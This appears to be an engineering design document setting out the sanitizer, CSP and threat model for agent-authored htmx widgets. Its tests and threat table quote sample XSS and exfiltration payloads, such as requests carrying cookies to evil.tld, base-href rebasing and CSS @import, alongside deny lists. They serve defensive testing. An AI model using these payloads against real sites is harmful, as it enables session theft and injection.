# Free-htmx widget — sandbox, CSP, sanitizer, threat model

**Status:** plan / decision document (research)
**Bead:** ka-0000000873 (Research: free-htmx sandbox + CSP + sanitizer policy)
**Parent epic:** ka-0000006879 (Research epic: free-form htmx widget)
**Siblings:**
- ka-0000000776 — wire shape + template contract
- ka-0000007136 — backend contract for htmx
- ka-0000007457 — migration: port a Phase-4 widget
- ka-0000002102 — dogfooding + operator UX
- ka-0000003004 — gardener authoring loop
**Context:**
- ka-0000001930 — widget definition / registration / lifecycle (closed)
- gardenio/docs/audits/ingress-tls-static.md (CSP F6 finding)
- gardenio/docs/csp-unsafe-inline-deferral.md
- gardenio/docs/security/audit-beads3d.md

## TL;DR

- **Render inline, not in an iframe.** A `<iframe sandbox>` would break the htmx
  round-trip (separate document → no swap into parent DOM, separate cookie jar,
  separate CSP, separate origin for `connect-src 'self'`). The whole point of
  the substrate is that widgets cooperate with the parent page. The sandbox is
  built from CSP + sanitizer, not from origin isolation.
- **Sanitizer = `bluemonday.UGCPolicy()` + a tight `hx-*` allowlist + a strict
  URL allowlist.** Allow exactly six htmx attributes
  (`hx-get`, `hx-post`, `hx-target`, `hx-swap`, `hx-trigger`, `hx-confirm`).
  Ban `hx-on`, `hx-vals` (the JS-eval form), `hx-headers`, `hx-include`,
  `hx-ext`, `hx-vars`, and every `on*=` attribute.
- **URLs in `hx-get` / `hx-post` / `<a href>` / `<form action>` MUST be
  same-origin AND path-prefixed under `/htmx/widget/...`.** Reject scheme
  (`javascript:`, `data:`, `blob:`, `vbscript:`, `file:`, `about:`), reject
  any explicit host, reject `..` segments, reject query params containing
  control characters. Images use the existing `bundleImageHostWhitelist`
  (`GARDENIO_BUNDLE_IMAGE_HOSTS` env, S3 by default), nothing wider.
- **CSP for the widget rendering route is the *strict* variant** —
  `script-src 'self'` (no `'unsafe-inline'`, no `'unsafe-eval'`), `connect-src
  'self'`, `form-action 'self'`, `frame-ancestors 'none'`, `frame-src 'none'`,
  `object-src 'none'`, `base-uri 'none'`. Style is `'self' 'unsafe-inline'`
  (we re-use beads-viewer page CSS); class names are namespace-prefixed `w-`
  via the sanitizer and the renderer rejects authoring `style=` attributes.
- **Hard never-allow list (sanitizer rejects, write tests for each):**
  `<script>`, `<iframe>`, `<object>`, `<embed>`, `<base>`, `<link>`, `<meta>`,
  `<style>`, every inline event handler (`onclick`, `onerror`, …), `hx-on*`,
  `style=`, `srcdoc=`, `formaction=`, `formtarget=`, scheme-bearing URLs that
  are not `https:` against the existing image allowlist or relative paths
  beginning with `/htmx/widget/`.

## 1. Render model — inline vs. iframe

### Why not iframe sandboxing

`<iframe sandbox>` provides strong origin-isolation: scripts run in a separate
origin, can't read parent cookies, and CSP is per-document. That sounds great
for "agent-authored HTML", but the substrate we're building is the opposite of
isolated:

| Concern | Iframe sandbox | Inline (chosen) |
|---|---|---|
| htmx swap target | Iframe's own DOM only — `hx-target` cannot reference parent. Forces postMessage shim. | Direct: `hx-target="#beadshow-foo"` swaps into the parent page. |
| Cookies / OIDC session | Cross-origin: separate session if served from a different origin; same-origin still shares but `Sec-Fetch-Site` becomes `same-origin` from a sandboxed doc. | Same-origin always; widget calls inherit the user's beads-viewer session. |
| CSP | Per-iframe CSP (would need its own header). | One page CSP applies. |
| `connect-src 'self'` | "self" is the iframe's origin, not beads-viewer's. Need wildcard or special endpoint. | Identity. `'self'` works for `/htmx/widget/...` round-trips. |
| Layout / sizing | Iframe is a fixed-size box; needs a JS resize observer. | Block-level element, sizes naturally. |
| Developer ergonomics | Authors must learn the postMessage protocol; widgets become opaque to the rest of the page. | Authors write HTML that drops in. |
| Defense | Origin isolation. | Sanitizer + CSP — same defense surface as beads-viewer's existing markdown rendering. |

The cost of iframe sandboxing is the loss of the very property that makes the
free-htmx widget worth building. We take the inline path and pay for it with a
**very strict sanitizer + CSP**.

### What "inline" means concretely

1. The widget renderer (`renderer_kind=htmx`, ka-0000000776) runs the agent's
   Go `html/template` server-side, producing an HTML fragment string.
2. That fragment is fed to `bluemonday.UGCPolicy() + freeHtmxAdditions()` and
   the URL allowlist policy.
3. The sanitized fragment is wrapped in `<div class="w-instance"
   data-widget-instance="{{.ID}}">…</div>` and concatenated into the
   bead-show page.
4. The page is served with the strict CSP (see §3). htmx is loaded once at
   the layout level (`/assets/static/htmx.min.js`) — no widget can re-load it,
   no widget can include other scripts.

The wrapper `div` is the only piece of page chrome the renderer adds; it gives
us a reliable `data-widget-instance` hook for tests, deletion, and per-widget
CSS isolation.

### Edge case — agents that *want* iframe-grade isolation

A widget author may legitimately want an iframe (e.g. an embedded mermaid
diagram, an embedded video). For v1 we explicitly do **not** support this:
agents who need it can request a built-in widget through the existing
draft → proposed → stable lifecycle (ka-0000001930), which is reviewed and
landed as Go code. We re-evaluate after Phase 4 ships.

## 2. Sanitizer — bluemonday + hx-* policy

### Library choice — `bluemonday`

| Candidate | Verdict | Why |
|---|---|---|
| `github.com/microcosm-cc/bluemonday` | **Chosen** | Go-native (no JS shell-out), well-maintained, used by Caddy / Hugo / Mattermost / Gitea, allowlist model (no blacklist mistakes), composable policies. |
| DOMPurify (server-side via tooling) | Rejected | Requires a JS runtime (node, v8go, goja). Adds a process boundary or an in-process JS engine — both are larger attack surfaces than a Go regex/AST sanitizer. The renderer is Go; bluemonday fits the deployment shape. |
| Custom HTML parser + allowlist | Rejected | Re-implementing `golang.org/x/net/html` correctness for sanitization is a known footgun (mxss, mutation XSS, namespace confusion). bluemonday already wraps the `x/net/html` parser correctly. |
| `goquery` filter post-pass | Rejected | Not a sanitizer. Post-DOM filtering after parsing leaves room for serializer mutation XSS. |
| `html/template` only | Insufficient | Escapes context-aware text but does NOT remove `<script>` from author-provided fragments — the agent's template *output* is itself raw HTML that must be sanitized. |

### Base policy

Start from `bluemonday.UGCPolicy()`. UGC is the right baseline: it allows
typical document elements (h1-h6, p, ul, ol, li, blockquote, pre, code, em,
strong, table, thead, tbody, tr, th, td, br, hr, img with safe URL schemes,
a with safe URL schemes), strips `<script>`, `<style>`, `<iframe>`, event
handlers, and dangerous URL schemes by default.

Then, on top of UGCPolicy, we add a small surgical set of allowances:

```go
func FreeHtmxPolicy() *bluemonday.Policy {
    p := bluemonday.UGCPolicy()

    // htmx attribute allowlist — strict.
    htmxAttrs := []string{"hx-get", "hx-post", "hx-target", "hx-swap", "hx-trigger", "hx-confirm"}
    for _, a := range htmxAttrs {
        p.AllowAttrs(a).OnElements("a", "button", "div", "form", "span", "input", "select", "tr", "td", "li")
    }

    // hx-get / hx-post: same-origin, path-prefixed under /htmx/widget/.
    p.AllowAttrs("hx-get").Matching(htmxURLPattern).OnElements("a", "button", "div", "span", "form", "input", "tr", "td", "li")
    p.AllowAttrs("hx-post").Matching(htmxURLPattern).OnElements("a", "button", "div", "span", "form", "input", "tr", "td", "li")

    // hx-target: only #ids matching ^#w-[a-zA-Z0-9_-]+$ (own-widget scope).
    p.AllowAttrs("hx-target").Matching(regexp.MustCompile(`^(this|#w-[a-zA-Z0-9_-]+|closest [a-z]+|find [a-z]+)$`)).Globally()

    // hx-swap: a finite enum.
    p.AllowAttrs("hx-swap").Matching(regexp.MustCompile(`^(innerHTML|outerHTML|beforebegin|afterbegin|beforeend|afterend|delete|none)$`)).Globally()

    // hx-trigger: 'click', 'submit', 'change', 'load', 'every Ns' (5s minimum), 'revealed'.
    p.AllowAttrs("hx-trigger").Matching(regexp.MustCompile(`^(click|submit|change|load|revealed|every \d+s)$`)).Globally()

    // hx-confirm: free text (sanitized), used for confirm dialogs.
    p.AllowAttrs("hx-confirm").Matching(regexp.MustCompile(`^[\p{L}\p{N}\s\.\?\!,'-]{1,200}$`)).Globally()

    // CSS classes: must be 'w-' prefixed (namespace isolation) — ka-0000001930.
    p.AllowAttrs("class").Matching(regexp.MustCompile(`^(w-[a-zA-Z0-9_-]+(\s+w-[a-zA-Z0-9_-]+)*)$`)).Globally()

    // data-* attributes for widget hooks — restrict prefix.
    p.AllowAttrs("data-widget-key", "data-widget-value", "data-bead-id").Globally()

    // id: must be 'w-' prefixed — see above.
    p.AllowAttrs("id").Matching(regexp.MustCompile(`^w-[a-zA-Z0-9_-]+$`)).Globally()

    // Image hosts: reuse the existing whitelist from bundle_renderers.go.
    // (Wire this via a custom URL policy that calls isWhitelistedImageHost.)

    // Explicit revocations — defense in depth even if UGCPolicy already strips.
    p.AllowElements()  // do NOT add: script, iframe, object, embed, base, link, meta, style.
    // Bluemonday strips unknown elements by default; we just don't allow them.

    return p
}
```

The actual `htmxURLPattern` regex enforces:

- Optional empty prefix or single `/`.
- Path begins with `/htmx/widget/`.
- Path segments are `[a-zA-Z0-9_./-]+`, no `..`.
- No scheme (`://`), no leading `//`.

```go
var htmxURLPattern = regexp.MustCompile(`^/htmx/widget/[a-zA-Z0-9_/.~-]+(\?[a-zA-Z0-9_=&%.~+-]+)?$`)
```

Empty path, paths containing `..`, paths beginning with anything other than
`/htmx/widget/`, query strings with `<`, `>`, `"`, `'`, backtick, or
percent-decoded control chars are all rejected — bluemonday drops the
attribute (not the element) when the regex doesn't match.

### Why these specific htmx attributes

| Attribute | Allowed? | Reason |
|---|---|---|
| `hx-get`, `hx-post` | Yes (same-origin path-prefix only) | Core round-trip primitive. |
| `hx-target` | Yes (`this`, `#w-…`, `closest`, `find`) | Required for swaps, but cannot point at parent-page DOM (no `#beads-viewer-toolbar` hijack). |
| `hx-swap` | Yes (enumerated) | Enum prevents future htmx versions from quietly broadening behaviour. `transition:` is excluded — no view-transition exfiltration. |
| `hx-trigger` | Yes (limited) | `every Ns` polling is allowed only with `N >= 5` (sanitizer regex enforces; runtime additionally rate-limits via the existing `/htmx/widget/` route handler). `keyup`, `mouseenter`, `revealed[once]`, etc. excluded — they can be re-allowed later if needed. |
| `hx-confirm` | Yes (sanitized) | UX nicety; renders a `confirm()` dialog. Length-bounded to prevent fingerprinting / UI-spoofing payloads. |
| `hx-on`, `hx-on:*` | **NO** | This is an inline-JS event handler. Equivalent to `onclick=` — the entire reason we have a sanitizer. |
| `hx-vals` (JS form `js:…`) | **NO** | Allows `eval`-equivalent JS expressions in attribute values. |
| `hx-vals` (plain JSON form) | Re-evaluate in v2 | Useful but increases auditability cost; defer until a concrete use case lands. |
| `hx-headers` | **NO** | Allows widget to set arbitrary request headers, including `X-Requested-With` spoofing, `Authorization`, custom CSRF tokens, or `Cookie` (browsers strip Cookie but not all custom-auth headers). Backend contract (ka-0000007136) provides whatever headers the widget legitimately needs server-side. |
| `hx-include` | **NO** | Pulls form values from arbitrary CSS selectors elsewhere on the page — direct exfiltration vector ("include `#bead-secrets-textarea` in the POST body"). |
| `hx-ext` | **NO** | Loads htmx extensions; supply-chain risk on untrusted templates. |
| `hx-vars` | **NO** (deprecated by htmx anyway) | Same JS-eval problem as `hx-on`. |
| `hx-disable` | Re-evaluate | Useful for anti-flicker UX; defer. |
| `hx-boost` | **NO** | Auto-rewrites all `<a>`/`<form>` on a subtree to use htmx — surprising scope creep within a widget. |
| `hx-push-url` | **NO** | Allows widget to mutate the parent page URL — confusing UX, possible click-jacking of "looks like /b/ka-X" routes. |
| `hx-ws`, `hx-sse` | **NO** | Long-lived connections to attacker-chosen URLs; revisit after Phase 4. |

This list is conservative on purpose. Re-allowing a stripped attribute is a
small future MR; reverting an over-broad initial allowlist after we ship is
much harder.

### URL allowlist details

`hx-get` / `hx-post` / `<a href>` / `<form action>` / `<img src>` / `<source
src>`:

- `hx-get`, `hx-post`, `<form action>` — must match `htmxURLPattern`
  (path-prefixed `/htmx/widget/...`, same-origin, no scheme).
- `<a href>` — `https:` to a separately-allowlisted **link host set** (reused
  from beads-viewer markdown link rules), or relative path beginning with
  `/b/`, `/bundle/`, `/decisions/`, `/agents/`, or `/htmx/widget/` — the
  existing beads-viewer routes. No `mailto:`, `tel:`, `javascript:`,
  `data:`, `vbscript:`, `file:`, `about:`, `chrome:`, `intent:`, etc.
- `<img src>` — relative path (asset on `/assets/...`) OR `https:` to a host
  in `bundleImageHostWhitelist()` (extends bundle renderer reuse, ka-0000001930
  §image hosts). `data:image/png|jpeg|webp` is rejected for v1 — it's
  cheap to allow but expands the SVG/XSS surface; agents wanting a static
  diagram can publish to S3.
- `<source src>` (audio/video tags) — both elements removed entirely from
  the allowlist. We can re-add behind an explicit allowlist if a use case
  emerges.

### URL validation pipeline

The bluemonday regex is a syntactic gate. The runtime route handler
(`/htmx/widget/{widget_name}/{instance_id}/{action}`) is the semantic gate:

1. Parse the URL with `net/url.Parse` (rejects malformed).
2. Reject if `URL.Host != ""` or `URL.Scheme != ""` (no
   protocol-relative `//evil.tld` snuck through the regex).
3. Resolve the path against the route table; reject any segment containing
   `..` after `path.Clean`.
4. Look up the widget instance bead; reject if it doesn't exist or doesn't
   belong to the requesting user's session (auth check).
5. Rate-limit per-instance and per-widget-name.

Bluemonday and the runtime handler defend each other: if a regex bug lets
something through, the handler still rejects it, and vice versa.

### CSS / class namespacing

Per ka-0000001930, all classes must be `w-`-prefixed. Sanitizer enforces this
via `Matching(regexp.MustCompile("^(w-[a-zA-Z0-9_-]+(\s+w-[a-zA-Z0-9_-]+)*)$"))`.
Stylesheets ship with the beads-viewer build; widgets cannot author `<style>`
blocks or `style=` attributes (both stripped). To extend the available class
set, a widget author lands a beads-viewer CSS MR — that's explicitly the
opt-in we want for visual changes.

### Tests

- `TestFreeHtmxSanitizer_StripsScript` — `<script>alert(1)</script>` →
  removed entirely.
- `TestFreeHtmxSanitizer_StripsHxOn` — `<button hx-on:click="alert(1)">` →
  attribute removed, button preserved.
- `TestFreeHtmxSanitizer_StripsExternalHxGet` — `hx-get="https://evil.tld"`
  → attribute removed.
- `TestFreeHtmxSanitizer_StripsRelativeNonHtmxPath` — `hx-get="/b/ka-x/close"`
  → attribute removed (only `/htmx/widget/...` allowed).
- `TestFreeHtmxSanitizer_AllowsHtmxRoundTrip` — `<button hx-post="/htmx/widget/foo/ka-1/click" hx-target="#w-out" hx-swap="innerHTML">go</button>`
  → preserved unchanged.
- `TestFreeHtmxSanitizer_StripsNonWClass` — `<div class="bead-toolbar">` →
  class stripped, div preserved.
- `TestFreeHtmxSanitizer_StripsHxInclude` — covers exfiltration vector.
- `TestFreeHtmxSanitizer_StripsHxHeaders` — covers header-spoofing vector.
- `TestFreeHtmxSanitizer_StripsHxExt` — covers extension-load vector.
- `TestFreeHtmxSanitizer_StripsBaseTag` — `<base href="https://evil.tld">`
  rebases all relative URLs; must be killed.
- `TestFreeHtmxSanitizer_StripsMetaRefresh` — `<meta http-equiv="refresh">`.
- `TestFreeHtmxSanitizer_StripsLinkRel` — `<link rel="stylesheet">`.
- `TestFreeHtmxSanitizer_StripsFormaction` — `<button formaction="javascript:…">`.
- `TestFreeHtmxSanitizer_StripsSrcdoc` — `<iframe srcdoc>` (iframe stripped, but
  defence in depth).
- `TestFreeHtmxSanitizer_RejectsDataURI` — `<img src="data:…">` → `src`
  stripped; `<img>` either preserved with no src or removed.
- `TestFreeHtmxSanitizer_RejectsJavascriptURL` — every URL attribute.
- A **mutation-XSS corpus** test: feed each of the OWASP DOMpurify attack
  strings into the sanitizer and assert the output renders inert in headless
  Chromium during a Playwright test (ka-0000000873 pen-test reference for
  Phase 3).

## 3. CSP for widget-rendering routes

The existing default CSP (`gardenio/helm/gardenio/templates/security-headers.yaml`):

```
default-src 'self';
script-src 'self' 'unsafe-inline';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
font-src 'self' data:;
connect-src 'self' wss://*.<apex> wss://<apex>;
frame-ancestors 'none'
```

`'unsafe-inline'` on `script-src` is already a known-bad (audit F6 in
ingress-tls-static.md). The free-htmx widget is the right place to *finally
remove it*, because:

1. Free-htmx widgets are an HTML fragment — they cannot include `<script>`
   anyway (sanitizer strips). They also cannot include `style=` (sanitizer
   strips) or `on*=` (sanitizer strips).
2. The htmx loader is a single same-origin file (`<script
   src="/assets/static/htmx.min.js" defer>`).
3. Beads-viewer's other Vite-bundled SPAs (advice, agents, decisions) are
   static; they can either be migrated to a hash-based CSP or kept on the
   default CSP (see §6 Migration).

### Strict CSP (widget-rendering routes only — bead-show, rich-report)

```
default-src 'none';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data: https://s3.amazonaws.com https://*.s3.amazonaws.com;
font-src 'self' data:;
connect-src 'self';
form-action 'self';
frame-ancestors 'none';
frame-src 'none';
object-src 'none';
base-uri 'none';
manifest-src 'none';
worker-src 'none';
upgrade-insecure-requests;
report-uri /htmx/widget/csp-report
```

Rationale per directive:

- `default-src 'none'` — fail-closed. Every directive must be explicit.
- `script-src 'self'` — htmx itself plus any beads-viewer page bundles.
  No `'unsafe-inline'`, no `'unsafe-eval'`. Widgets cannot inject inline
  script even if a sanitizer regression let them try.
- `style-src 'self' 'unsafe-inline'` — beads-viewer ships `<style>` blocks
  in its layout (header/footer styling). Widgets cannot author `<style>`
  (sanitizer) or `style=` (sanitizer). The `'unsafe-inline'` is for our
  layout, not for widget content. Future tightening: nonce the layout's
  inline styles. Out of scope for this plan.
- `img-src` — same-origin assets, `data:` for small inline (favicons,
  layout-level), and the existing image host allowlist (S3 default; expand
  through `GARDENIO_BUNDLE_IMAGE_HOSTS`).
- `connect-src 'self'` — htmx round-trips back to the rendering origin
  only. `wss://` is *intentionally* excluded on widget pages: live updates
  flow via SSE/htmx polling, not WebSockets, on widget routes. WebSocket
  pages keep the default CSP.
- `form-action 'self'` — `<form action>` cannot post to an external host
  even if the sanitizer regex regresses.
- `frame-ancestors 'none'` — beads-viewer pages cannot be embedded in any
  iframe, defeating click-jacking onto widget surfaces.
- `frame-src 'none'`, `object-src 'none'`, `base-uri 'none'`,
  `manifest-src 'none'`, `worker-src 'none'` — defence in depth; the
  sanitizer already strips these elements/attributes, and CSP catches
  anything that slips through.
- `upgrade-insecure-requests` — any accidentally-relative `http:` URL is
  promoted to `https:`.
- `report-uri /htmx/widget/csp-report` — capture violations in production;
  every report becomes a kbeads bug bead automatically (cron job summarizes
  per-day).

### Per-route override mechanism

Add a `securityHeadersVariant` IngressRoute label
(`security-headers-strict-htmx`) and a third Traefik middleware in
`gardenio/helm/gardenio/templates/security-headers.yaml`. Beads-viewer
routes that render widgets get that middleware. Other routes keep the
existing default. This avoids a global CSP change and makes the gate
release-by-release reversible.

### Why we keep `'unsafe-inline'` on `style-src`

Beads-viewer's existing layout uses inline `<style>` and inline `style=` on
non-widget chrome (e.g. inline-svg sizing, hot-loaded class definitions).
Migrating all of them to nonce/hash takes effort orthogonal to this task and
already has a deferral note (gardenio/docs/csp-unsafe-inline-deferral.md).
Widgets themselves *cannot* benefit from `'unsafe-inline'` because the
sanitizer strips `style=` and `<style>` regardless of CSP. Tightening the
style directive is tracked in ka-0000003367 or a follow-up.

## 4. Threat model

### In-scope

| # | Attack | Vector | Mitigation |
|---|---|---|---|
| T1 | Stored XSS in widget body | Agent template renders `<script>` or inline `on*=` handlers from data | Sanitizer (UGCPolicy strips) + CSP `script-src 'self'` (no inline) |
| T2 | DOM-clobbering / form-action hijack | Widget includes `<form action="javascript:…">` or `<button formaction="…">` | UGCPolicy + explicit `formaction`/`formtarget` allowlist (deny) + CSP `form-action 'self'` |
| T3 | CSRF against beads-viewer/gardenio APIs from a widget | Widget posts to `/decisions/{id}/resolve` with the operator's cookies | URL allowlist forbids any path outside `/htmx/widget/...`. The `/htmx/widget/...` routes themselves require a per-instance signed token (ka-0000007136) and reject `Origin`/`Referer` mismatch. CSP `connect-src 'self'` + `form-action 'self'`. SameSite=Lax on the OIDC session cookie. |
| T4 | Cross-widget data exfil via `hx-include` | Widget A includes `#bead-secrets-textarea` from another widget | `hx-include` not allowed |
| T5 | Header-injection / token spoofing via `hx-headers` | Widget sets `X-Forwarded-User`, `Authorization`, `X-Internal-…` | `hx-headers` not allowed; backend ignores user-supplied auth headers anyway (oidc-aware) |
| T6 | Inline-JS via `hx-on*` | `<button hx-on:click="fetch('/secrets')">` | `hx-on*` not allowed; CSP `script-src 'self'` blocks the resulting handler even if attribute slips through |
| T7 | SVG-borne XSS | `<svg><script>` or `<svg onload>` | UGCPolicy strips `<script>` inside SVG; `<svg>` itself remains allowed (UGC default), but the inner script and event-handlers are stripped. We follow up by disallowing `<svg>` entirely if pen-test (Phase 3) finds a bypass. |
| T8 | Mutation XSS | Sanitizer output that the browser re-parses differently (mxss) | bluemonday wraps `golang.org/x/net/html` correctly, which is the standard mitigation. Pen-test corpus replays the OWASP mxss strings against the live renderer. |
| T9 | URL-scheme tricks | `hx-get="javascript:…"`, `<a href="data:…">`, `<a href="vbscript:…">` | UGCPolicy URL scheme allowlist + `htmxURLPattern` requires path-prefix |
| T10 | Click-jacking onto widgets | A malicious page iframes beads-viewer to harvest clicks | `frame-ancestors 'none'` |
| T11 | Polling / DoS via `every Ns` | `hx-trigger="every 100ms"` hammers the backend | Sanitizer regex requires `every \d+s` with `s` suffix; runtime route handler enforces `N >= 5` and per-instance rate limit |
| T12 | URL parameter exfil to attacker server | `hx-get="https://evil.tld?token={cookie}"` | URL allowlist forbids non-relative; CSP `connect-src 'self'` blocks; cookies are HttpOnly anyway |
| T13 | Widget-as-phishing | Widget renders fake "Sign in to Google" form | `form-action 'self'` blocks the post; `<a>` with external href passes through but is `rel=nofollow noopener noreferrer` (sanitizer adds via `RequireNoFollowOnLinks`/`RequireNoReferrerOnLinks` on UGCPolicy). Phishing UX risk remains — operator UX (ka-0000002102) shows a "rendered by free-htmx widget {name}" attribution chip on every instance. |
| T14 | Supply-chain template poisoning | Compromised widget-type bead carries malicious template | Widget-type beads are kbeads-audited, kbeads itself is the registry, and the proposed → stable promotion (ka-0000001930) keeps templates reviewable. Free-form `draft` widgets render with a visible "draft / agent-authored" badge; production rich-report beads should pin a `widget-stage:stable` widget-type by version. |
| T15 | `<base href>` URL rebase | `<base href="https://evil.tld">` makes all relative URLs in the document point to `evil.tld` | UGCPolicy strips `<base>`; CSP `base-uri 'none'` defends against the same |
| T16 | Inline event handler smuggled in capitalisation tricks | `<img Onerror=…>` | UGCPolicy normalises and strips `on*` regardless of case |
| T17 | DOM purify-style namespace confusion | `<math>` / `<svg>` foreign-content namespace tricks | UGCPolicy applies in the foreign namespace; mxss corpus exercises this. If a bypass is found, follow-up is to drop `<math>` and `<svg>` from the allowlist. |
| T18 | Resource-hint exfil | `<link rel="prefetch" href="https://evil.tld?{secret}">` | UGCPolicy strips `<link>`; CSP `default-src 'none'` blocks prefetch |
| T19 | CSS-borne exfil (`@import`, `url()`) | `<style>@import url(https://evil.tld);</style>` | UGCPolicy strips `<style>`; sanitizer disallows `style=`; CSP `style-src 'self' 'unsafe-inline'` does not allow external imports because the directive lists no remote origin (the `'unsafe-inline'` keyword does not allow external imports) |
| T20 | Open-redirect via `<a href>` | `<a href="https://attacker.tld">` → operator clicks | Link host allowlist (markdown-renderer lineage) — not auto-followed; `rel=nofollow noopener noreferrer` ensures no token leaks |

### Out-of-scope (documented explicitly so we don't regret it later)

- **Network-level exfil to the *backend* itself.** A widget can legitimately
  POST anything to `/htmx/widget/<own-name>/...` — that's the whole point.
  The backend is responsible for not echoing other users' data into a
  widget's response. Accept this; track abuse via per-widget audit logs
  and rate limits (ka-0000007136).
- **Server-side template injection.** The template *body* is authored by
  agents and reviewed (`ka-0000000776` decides the trust model). For v1
  we treat the template body as trusted-by-the-author and rely on
  `html/template` context-aware escaping for *data* substitution. SSTI
  defense lives in the wire-shape research, not here.
- **Denial of service by template render time.** A template that loops
  10⁶ times is in scope for ka-0000000776 (render time-bound).
- **Cross-tenant exfil at the kbeads layer.** kbeads RBAC + project
  scoping is the existing defense; widget infrastructure inherits it.
- **Compromised htmx.min.js.** Same supply-chain concern as the rest of
  beads-viewer. We pin the htmx version in `images/agent` build (kd-…
  follow-up if not already), and serve from same-origin so SRI is moot.

### Pen-test plan reference (Phase 3 hand-off)

Phase 3 (ka-0000006879 §Phase ladder) implementation MRs MUST include:

1. **Sanitizer corpus tests** — every row in §4 in-scope table has at
   least one regression test.
2. **Live Playwright pen-test** — render a malicious widget instance into
   a beads-viewer page in the test harness, navigate, assert no
   alert/cookie/network exfil. Use the OWASP DOMpurify mxss corpus
   (https://github.com/cure53/DOMPurify/tree/main/test/fixtures) plus
   htmx-specific payloads (hx-on, hx-include, hx-headers attempts).
3. **CSP-violation reporting harness** — assert that every blocked attempt
   raises a CSP report; the test harness collects reports and fails if
   none arrive.
4. **Static analysis pre-commit** — a `quench check` gate that runs the
   sanitizer over every widget-type template body in the repo at build
   time and fails the build on a delta vs. the policy.
5. **Operator-facing penetration runbook** — `gardenio/docs/runbooks/
   free-htmx-pentest.md` (Phase 3 deliverable) describing how to
   reproduce each test row manually.

## 5. Hard "never allow" list (sanitizer rejects, tests pin)

These are the non-negotiable denials. Each item has a sanitizer test that
must always pass (a failing test here is a release-blocker bug):

1. `<script>` — any tag, any namespace.
2. `<iframe>`, `<frame>`, `<frameset>`, `<object>`, `<embed>`, `<applet>`.
3. `<base>`, `<link>`, `<meta>`.
4. `<style>` and the `style=` attribute on any element.
5. Every `on*=` event-handler attribute (`onclick`, `onerror`, `onload`,
   `onmouseover`, `onfocus`, `onblur`, `oninput`, `onsubmit`, `onreset`,
   `oncopy`, `onpaste`, `oncut`, `onunload`, `onbeforeunload`, …) — case
   insensitive.
6. Every `hx-on*=` handler (`hx-on:click`, `hx-on::trigger`, etc.).
7. `hx-vals` with a value beginning `js:` (the JS-eval form).
8. `hx-headers` (any value).
9. `hx-include` (any value).
10. `hx-ext` (any value).
11. `hx-vars` (any value).
12. `hx-boost`, `hx-push-url`, `hx-replace-url`, `hx-history`,
    `hx-history-elt` (any value).
13. `hx-ws`, `hx-sse` (any value).
14. URL schemes other than `https:` (and only via the host allowlist) or
    relative paths matching the allowlist regex. Explicitly: `javascript:`,
    `data:` (except internally for the layout — never from a widget),
    `vbscript:`, `file:`, `about:`, `chrome:`, `chrome-extension:`,
    `intent:`, `view-source:`, `feed:`, `wyciwyg:`, `livescript:`,
    `mocha:`, `blob:`.
15. `srcdoc=`, `formaction=`, `formtarget=`, `formmethod=`,
    `formnovalidate=`, `formenctype=` on any element.
16. `target=` on `<a>` (except `_self`, sanitizer can rewrite). Prevents
    `target="_blank"` opener-leak; `rel=noopener noreferrer` is added by
    UGCPolicy to any external link as a belt-and-braces.
17. `<input type="…">` for `image`, `file`, `password` — file uploads and
    password collectors are out of scope for v1 widgets.
18. `<svg>`-internal `<script>`, `<foreignObject>`, `<use href="https://…">`.
    UGCPolicy handles most; we add `<foreignObject>` explicitly.
19. `<math>` foreign-content tricks — strip the element entirely until
    pen-test signs off.
20. ARIA attributes pointing at IDs outside the widget's own `id="w-…"`
    namespace (low-priority; deferred to §6 follow-up if assistive-tech
    audits flag).

The list is enumerated rather than expressed as a positive allowlist
because the sanitizer is itself an allowlist — UGCPolicy + the additions
above. The "never-allow" enumeration above is the explicit complement, used
as a test specification, audit checklist, and authoring guidance.

## 6. Open follow-ups

- **CSS namespacing follow-up bead** (ka-0000001930) — the renderer should
  emit a wrapping `<div class="w-instance" data-widget-name="{name}">` so
  beads-viewer page CSS can scope rules with `.w-instance .w-foo {…}`. Land
  with the implementation MR.
- **Image host allowlist surface** — current `bundleImageHostWhitelist` is
  env-var-driven and process-global. Promote to a typed config on the widget
  rendering route so per-instance overrides are auditable. Track in a
  follow-up under ka-0000007136.
- **CSP nonce migration** — once free-htmx ships, evaluate moving beads-viewer
  to `script-src 'self' 'nonce-…'` globally; coordinate with audit F6.
- **Pen-test corpus repository** — set up `gardenio/test/fixtures/free-htmx-
  attacks/` with the OWASP mxss strings + the htmx-specific payloads. Pin
  kd-… reference under Phase 3.
- **Operator UI** — render an "agent-authored: {agent-name}" attribution
  chip on every widget instance (ka-0000002102).
- **`<svg>` decision** — provisional: keep `<svg>` allowed via UGCPolicy
  for now (most rich-report beads benefit from inline diagrams). Phase 3
  pen-test must cover the SVG attack surface or we drop it entirely.

## 7. Decision summary (for the synthesis bead)

When ka-0000006879 Phase 2 (design synthesis) opens its `gb decision`, the
relevant entries from this plan are:

- **Render model:** inline (not iframe).
- **Sanitizer:** `bluemonday.UGCPolicy()` + `freeHtmxAdditions()` (six htmx
  attributes; `w-` class + id namespace; URL allowlist regex).
- **Backend URL contract:** `/htmx/widget/{widget-name}/{instance-id}/{action}`,
  same-origin only.
- **CSP:** strict variant on widget-rendering routes; `script-src 'self'`,
  `connect-src 'self'`, `form-action 'self'`, `frame-ancestors 'none'`,
  `default-src 'none'`. Plus a CSP-violation reporting endpoint.
- **Hard deny list:** §5, with sanitizer tests as the enforcement mechanism.
- **Out of scope for v1:** iframe widgets, `data:` images, `<audio>/<video>`,
  WebSocket / SSE inside widgets, `hx-vals` JSON form, ARIA-cross-widget,
  per-instance custom CSS.

Identity / RBAC / sanitizer-policy MRs hard-require a `gb decision` per
gardener rule — the gardener (ka-0000003094) opens that decision when this
plan lands.
